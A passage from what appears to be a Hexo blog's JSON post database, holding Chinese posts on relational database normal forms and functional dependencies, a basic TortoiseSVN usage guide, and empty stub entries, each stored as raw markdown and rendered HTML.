里面有我对当前段落的总结。</p>\n<p>欢迎大家和我探讨。</p>\n"},{"title":"爆裂鼓手·观后感","date":"2018-06-01T05:24:24.000Z","_content":"","source":"_posts/Movie/爆裂鼓手·观后感.md","raw":"---\ntitle: 爆裂鼓手·观后感\ndate: 2018-06-01 13:24:24\ntags: \ncategories: \n---\n","slug":"Movie/爆裂鼓手·观后感","published":1,"updated":"2018-09-05T06:33:18.493Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwc004hzodvzxcwuigf","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"关系数据库六大范式","date":"2018-06-25T06:17:53.000Z","_content":"","source":"_posts/SQL/关系数据库六大范式.md","raw":"---\ntitle: 关系数据库六大范式\ndate: 2018-06-25 14:17:53\ntags:\ncategories:\n---\n","slug":"SQL/关系数据库六大范式","published":1,"updated":"2018-09-05T06:33:18.507Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwe004kzodvbw76ldrq","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"数据库范式介绍","date":"2018-05-02T05:50:37.000Z","archives":"SQL范式","_content":"# [关系数据库·范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","source":"_posts/SQL/数据库范式介绍.md","raw":"---\ntitle: 数据库范式介绍\ndate: 2018-05-02 13:50:37\ntags: SQL范式\narchives: SQL范式\ncategories: 数据库\n---\n# [关系数据库·范式介绍](http://josh-persistence.iteye.com/blog/2200644)\n\n## 一、基本介绍\n设计`关系数据库`时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的`规范`要求被称为不同的`范式`,各种范式`呈 递次规范`,越`高`的 范式 数据库`冗余越小`。\n\n目前关系数据库有`六种`范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库`只需满足第三范式(3NF)就行`了。\n\n范式的`包含关系`。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…\n\n### **数据库基本概念**\n 要理解范式,首先必须对知道什么是`关系数据库`,简单的说:关系数据库就是用`二维表`来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。\n\n**实体**: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。\n\n**属性**: 教科书上解释为:“`实体所具有的某一特性`”，由此可见，属性一开始是个`逻辑概念`，比如说，“性别”是“人”的一个属性。在`关系数据库`中，属性又是个`物理概念`，属性可以看作是“`表的一列`”。\n\n**元组**：表中的一行就是一个元组。\n\n**分量**：`元组`的某个 `属性值`。在一个关系数据库中，它是一个`操作原子`，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。\n\n**码(键)**：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 `候选码`，我们从候选码中挑一个出来做老大，它就叫`主码(主键)`。\n\n**全码**：如果一个码包含了所有的属性，这个码就是全码。\n\n**主属性**：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。\n\n**非主属性**：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。\n\n**外码**：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。\n\n**候选码**： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。\n\n#### [数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别](https://blog.csdn.net/rl529014/article/details/48391465)\n**函数依赖**: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。\n\n**部分函数依赖**：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的`真子集`，存在X’→Y，则称Y 部分函数依赖于X。\n\n**完全函数依赖**：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的`真子集`，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)\n\n**传递函数依赖**：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。\n\n假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。\n\n## 二、6种范式\n前面说到，`范式越高`，数据的`冗余`度`越小`。其实`没有冗余`的数据库设计是`可以做到`的。但是，`没有冗余`的数据库`未必是最好的`数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)\n\n所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。\n\n**第一范式(1NF)：属性不可分**\n\n(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)\n\n不满足第一范式的数据库，不是关系数据库！\n\n**第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。**\n\n第二范式要求非主属性依赖于主关键字。\n\n（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）\n\n**第三范式（3NF）：符合2NF，并且，消除传递依赖。**\n（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）\n\n","slug":"SQL/数据库范式介绍","published":1,"updated":"2018-09-05T06:33:18.508Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwf004nzodv9a95d9n0","content":"<h1 id=\"关系数据库·范式介绍\"><a href=\"#关系数据库·范式介绍\" class=\"headerlink\" title=\"关系数据库·范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">关系数据库·范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关系数据库·范式介绍\"><a href=\"#关系数据库·范式介绍\" class=\"headerlink\" title=\"关系数据库·范式介绍\"></a><a href=\"http://josh-persistence.iteye.com/blog/2200644\" target=\"_blank\" rel=\"noopener\">关系数据库·范式介绍</a></h1><h2 id=\"一、基本介绍\"><a href=\"#一、基本介绍\" class=\"headerlink\" title=\"一、基本介绍\"></a>一、基本介绍</h2><p>设计<code>关系数据库</code>时,遵从不同的规范要求,设计出合理的关系型数据库,这些不同的<code>规范</code>要求被称为不同的<code>范式</code>,各种范式<code>呈 递次规范</code>,越<code>高</code>的 范式 数据库<code>冗余越小</code>。</p>\n<p>目前关系数据库有<code>六种</code>范式:第一范式(1NF)、第二范式(2NF)、第三范式(3NF)、巴斯-科德范式(BCNF)、第四范式(4NF)和第五范式(5NF,又称完美范式)。满足最低要求的范式是第一范式(1NF)。在第一范式的基础上进一步满足更多规范要求的称为第二范式(2NF),其余范式以次类推。一般说来,数据库<code>只需满足第三范式(3NF)就行</code>了。</p>\n<p>范式的<code>包含关系</code>。一个数据库设计如果符合第二范式,一定也符合第一范式。如果符合第三范式,一定也符合第二范式…</p>\n<h3 id=\"数据库基本概念\"><a href=\"#数据库基本概念\" class=\"headerlink\" title=\"数据库基本概念\"></a><strong>数据库基本概念</strong></h3><p> 要理解范式,首先必须对知道什么是<code>关系数据库</code>,简单的说:关系数据库就是用<code>二维表</code>来保存数据。表和表之间可以……(省略10W字),如果对数据库很熟悉,可以不用理会下面的概念。</p>\n<p><strong>实体</strong>: 现实世界中客观存在并可以被区别的事物。比如“一个学生”、“一本书”、“一门课”等等。值得强调的是这里所说的“事物”不仅仅是看得见摸得着的“东西”，它也可以是虚拟的，不如说“老师与学校的关系”。</p>\n<p><strong>属性</strong>: 教科书上解释为:“<code>实体所具有的某一特性</code>”，由此可见，属性一开始是个<code>逻辑概念</code>，比如说，“性别”是“人”的一个属性。在<code>关系数据库</code>中，属性又是个<code>物理概念</code>，属性可以看作是“<code>表的一列</code>”。</p>\n<p><strong>元组</strong>：表中的一行就是一个元组。</p>\n<p><strong>分量</strong>：<code>元组</code>的某个 <code>属性值</code>。在一个关系数据库中，它是一个<code>操作原子</code>，即关系数据库在做任何操作的时候，属性是“不可分的”。否则就不是关系数据库了。</p>\n<p><strong>码(键)</strong>：表中可以唯一确定一个元组的某个 属性(或者属性组)，如果这样的码有不止一个，那么大家都叫 <code>候选码</code>，我们从候选码中挑一个出来做老大，它就叫<code>主码(主键)</code>。</p>\n<p><strong>全码</strong>：如果一个码包含了所有的属性，这个码就是全码。</p>\n<p><strong>主属性</strong>：一个属性只要在任何一个候选码中出现过，这个属性就是主属性。</p>\n<p><strong>非主属性</strong>：与上面相反，没有在任何候选码中出现过，这个属性就是非主属性。</p>\n<p><strong>外码</strong>：一个属性(或属性组)，它不是码，但是它别的表的码，它就是外码。</p>\n<p><strong>候选码</strong>： 若关系中的某一属性或属性组的值能唯一的标识一个元组，而其任何真子集都不能再标识，则称该属性组为(超级码)候选码。</p>\n<h4 id=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"><a href=\"#数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\" class=\"headerlink\" title=\"数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别\"></a><a href=\"https://blog.csdn.net/rl529014/article/details/48391465\" target=\"_blank\" rel=\"noopener\">数据库，部分函数依赖，传递函数依赖，完全函数依赖，三种范式的区别</a></h4><p><strong>函数依赖</strong>: 设X,Y是关系R的两个属性集合,存在X→Y;则称Y 函数依赖于X。</p>\n<p><strong>部分函数依赖</strong>：设X,Y是关系R的两个属性集合，存在X→Y; 若X’是X的<code>真子集</code>，存在X’→Y，则称Y 部分函数依赖于X。</p>\n<p><strong>完全函数依赖</strong>：设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y; X’是X的<code>真子集</code>，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。(个人理解为 只能通过 X确定 Y，并且每个X’ 都不能确定Y 的关系 就是完全函数依赖)</p>\n<p><strong>传递函数依赖</strong>：设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z(Z !→Y)，则称Z传递函数依赖于X。</p>\n<p>假如 Z 函数依赖于 Y，且 Y 函数依赖于 X （『Y 不包含于 X，且 X 不函数依赖于 Y』这个前提），那么我们就称 Z 传递函数依赖于 X ，记作 X T→ Z，如图3。</p>\n<h2 id=\"二、6种范式\"><a href=\"#二、6种范式\" class=\"headerlink\" title=\"二、6种范式\"></a>二、6种范式</h2><p>前面说到，<code>范式越高</code>，数据的<code>冗余</code>度<code>越小</code>。其实<code>没有冗余</code>的数据库设计是<code>可以做到</code>的。但是，<code>没有冗余</code>的数据库<code>未必是最好的</code>数据库，有时为了提高运行效率，就必须降低范式标准，适当保留冗余数据。具体做法是：在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，允许冗余。(最典型的就是在一些数据表中不仅存作为外键的user_id,同样存user_name,这样虽然违反数据库范式增加了user_name字段，但是却提高了效率，减少了获取user_id后再去user表中获取user name的操作)</p>\n<p>所以实际中，我们只需要考虑数据库满足第三范式就可以了,下面以最通俗的方式来解释数据库的范式。</p>\n<p><strong>第一范式(1NF)：属性不可分</strong></p>\n<p>(1NF是对属性的原子性约束，要求属性具有原子性，不可再分解)</p>\n<p>不满足第一范式的数据库，不是关系数据库！</p>\n<p><strong>第二范式（2NF）：符合1NF，并且非主属性完全依赖于码。</strong></p>\n<p>第二范式要求非主属性依赖于主关键字。</p>\n<p>（2NF是对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性，更通俗说有主键ID）</p>\n<p><strong>第三范式（3NF）：符合2NF，并且，消除传递依赖。</strong><br>（3NF是对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余）</p>\n"},{"title":"SVN使用指南","date":"2018-09-12T03:20:12.000Z","_content":"## 几个概念要必须掌握：\n`checkout`--->将SVN仓库的代码烤到本地，比如你现在参与一个团队项目，项目代码在你之前肯定已经写了很多了，你可以通过checkout项目代码，获得整个项目。\n\n`update`--->在你写代码的过程中，同事很可能已经提交过代码到SVN服务器，而你本地项目显然没有同事新提交的代码，你可以通过update SVN获得SVN最新的代码。\n\n`commit`--->当你完成一部分开发后，你可以通过commit提交代码到SVN服务器，这样别人就可以获得你写的代码，记得 **先update再commit**。\n\n## TortoiseSVN图标介绍\n+ 绿色对勾重载，表示Svn状态正常\n+ 红色感叹号，表示文件状态状态变成 已修改\n+ 黄色感叹号，表示提交过程出现冲突 \n+ 蓝色加号，表示 一个 文件/目录 已经被加入到 版本控制中\n\n## SVN Client 基础操作\n1. SVN检出(Checkout)\\\n    输入 url ， 确定本地 代码库 地址\n\n弹出`用户名` `密码验证`\n\n### Add 增加\n1. 先提交到变更列表，再 `commit` 到配置库：选择`新增文件`，右键SVN菜单执行`Add`， 提交到`变更列表`，然后右键SVN菜单执行`SVN Commit`提交到版本库\n\n2. 不提交到变更列表，直接commit配置库：直接选择文件，右键SVN菜单执行`SVN Commit`操作。\n\n### Delete 删除\n如果被删文件 未入版本库，可直接使用操作系统删除\n\n如果被删文件 已入版本库：\n1. 选择被删文件， 右键 SVN菜单 执行`delete`操作\n2. 选择被删文件父级目录， 右键 SVN菜单 执行`SVN Commit`\n\n### Rename 改名\n\n\n### SVN Revert 还原\n右键SVN菜单 `Update to reversion`\n","source":"_posts/SVN/SVN使用指南.md","raw":"---\ntitle: SVN使用指南\ndate: 2018-09-12 11:20:12\ntags: SVN使用\ncategories: SVN\n---\n## 几个概念要必须掌握：\n`checkout`--->将SVN仓库的代码烤到本地，比如你现在参与一个团队项目，项目代码在你之前肯定已经写了很多了，你可以通过checkout项目代码，获得整个项目。\n\n`update`--->在你写代码的过程中，同事很可能已经提交过代码到SVN服务器，而你本地项目显然没有同事新提交的代码，你可以通过update SVN获得SVN最新的代码。\n\n`commit`--->当你完成一部分开发后，你可以通过commit提交代码到SVN服务器，这样别人就可以获得你写的代码，记得 **先update再commit**。\n\n## TortoiseSVN图标介绍\n+ 绿色对勾重载，表示Svn状态正常\n+ 红色感叹号，表示文件状态状态变成 已修改\n+ 黄色感叹号，表示提交过程出现冲突 \n+ 蓝色加号，表示 一个 文件/目录 已经被加入到 版本控制中\n\n## SVN Client 基础操作\n1. SVN检出(Checkout)\\\n    输入 url ， 确定本地 代码库 地址\n\n弹出`用户名` `密码验证`\n\n### Add 增加\n1. 先提交到变更列表，再 `commit` 到配置库：选择`新增文件`，右键SVN菜单执行`Add`， 提交到`变更列表`，然后右键SVN菜单执行`SVN Commit`提交到版本库\n\n2. 不提交到变更列表，直接commit配置库：直接选择文件，右键SVN菜单执行`SVN Commit`操作。\n\n### Delete 删除\n如果被删文件 未入版本库，可直接使用操作系统删除\n\n如果被删文件 已入版本库：\n1. 选择被删文件， 右键 SVN菜单 执行`delete`操作\n2. 选择被删文件父级目录， 右键 SVN菜单 执行`SVN Commit`\n\n### Rename 改名\n\n\n### SVN Revert 还原\n右键SVN菜单 `Update to reversion`\n","slug":"SVN/SVN使用指南","published":1,"updated":"2018-09-12T03:56:20.347Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwh004ozodvx8j7ftts","content":"<h2 id=\"几个概念要必须掌握：\"><a href=\"#几个概念要必须掌握：\" class=\"headerlink\" title=\"几个概念要必须掌握：\"></a>几个概念要必须掌握：</h2><p><code>checkout</code>—&gt;将SVN仓库的代码烤到本地，比如你现在参与一个团队项目，项目代码在你之前肯定已经写了很多了，你可以通过checkout项目代码，获得整个项目。</p>\n<p><code>update</code>—&gt;在你写代码的过程中，同事很可能已经提交过代码到SVN服务器，而你本地项目显然没有同事新提交的代码，你可以通过update SVN获得SVN最新的代码。</p>\n<p><code>commit</code>—&gt;当你完成一部分开发后，你可以通过commit提交代码到SVN服务器，这样别人就可以获得你写的代码，记得 <strong>先update再commit</strong>。</p>\n<h2 id=\"TortoiseSVN图标介绍\"><a href=\"#TortoiseSVN图标介绍\" class=\"headerlink\" title=\"TortoiseSVN图标介绍\"></a>TortoiseSVN图标介绍</h2><ul>\n<li>绿色对勾重载，表示Svn状态正常</li>\n<li>红色感叹号，表示文件状态状态变成 已修改</li>\n<li>黄色感叹号，表示提交过程出现冲突 </li>\n<li>蓝色加号，表示 一个 文件/目录 已经被加入到 版本控制中</li>\n</ul>\n<h2 id=\"SVN-Client-基础操作\"><a href=\"#SVN-Client-基础操作\" class=\"headerlink\" title=\"SVN Client 基础操作\"></a>SVN Client 基础操作</h2><ol>\n<li>SVN检出(Checkout)\\<br> 输入 url ， 确定本地 代码库 地址</li>\n</ol>\n<p>弹出<code>用户名</code> <code>密码验证</code></p>\n<h3 id=\"Add-增加\"><a href=\"#Add-增加\" class=\"headerlink\" title=\"Add 增加\"></a>Add 增加</h3><ol>\n<li><p>先提交到变更列表，再 <code>commit</code> 到配置库：选择<code>新增文件</code>，右键SVN菜单执行<code>Add</code>， 提交到<code>变更列表</code>，然后右键SVN菜单执行<code>SVN Commit</code>提交到版本库</p>\n</li>\n<li><p>不提交到变更列表，直接commit配置库：直接选择文件，右键SVN菜单执行<code>SVN Commit</code>操作。</p>\n</li>\n</ol>\n<h3 id=\"Delete-删除\"><a href=\"#Delete-删除\" class=\"headerlink\" title=\"Delete 删除\"></a>Delete 删除</h3><p>如果被删文件 未入版本库，可直接使用操作系统删除</p>\n<p>如果被删文件 已入版本库：</p>\n<ol>\n<li>选择被删文件， 右键 SVN菜单 执行<code>delete</code>操作</li>\n<li>选择被删文件父级目录， 右键 SVN菜单 执行<code>SVN Commit</code></li>\n</ol>\n<h3 id=\"Rename-改名\"><a href=\"#Rename-改名\" class=\"headerlink\" title=\"Rename 改名\"></a>Rename 改名</h3><h3 id=\"SVN-Revert-还原\"><a href=\"#SVN-Revert-还原\" class=\"headerlink\" title=\"SVN Revert 还原\"></a>SVN Revert 还原</h3><p>右键SVN菜单 <code>Update to reversion</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"几个概念要必须掌握：\"><a href=\"#几个概念要必须掌握：\" class=\"headerlink\" title=\"几个概念要必须掌握：\"></a>几个概念要必须掌握：</h2><p><code>checkout</code>—&gt;将SVN仓库的代码烤到本地，比如你现在参与一个团队项目，项目代码在你之前肯定已经写了很多了，你可以通过checkout项目代码，获得整个项目。</p>\n<p><code>update</code>—&gt;在你写代码的过程中，同事很可能已经提交过代码到SVN服务器，而你本地项目显然没有同事新提交的代码，你可以通过update SVN获得SVN最新的代码。</p>\n<p><code>commit</code>—&gt;当你完成一部分开发后，你可以通过commit提交代码到SVN服务器，这样别人就可以获得你写的代码，记得 <strong>先update再commit</strong>。</p>\n<h2 id=\"TortoiseSVN图标介绍\"><a href=\"#TortoiseSVN图标介绍\" class=\"headerlink\" title=\"TortoiseSVN图标介绍\"></a>TortoiseSVN图标介绍</h2><ul>\n<li>绿色对勾重载，表示Svn状态正常</li>\n<li>红色感叹号，表示文件状态状态变成 已修改</li>\n<li>黄色感叹号，表示提交过程出现冲突 </li>\n<li>蓝色加号，表示 一个 文件/目录 已经被加入到 版本控制中</li>\n</ul>\n<h2 id=\"SVN-Client-基础操作\"><a href=\"#SVN-Client-基础操作\" class=\"headerlink\" title=\"SVN Client 基础操作\"></a>SVN Client 基础操作</h2><ol>\n<li>SVN检出(Checkout)\\<br> 输入 url ， 确定本地 代码库 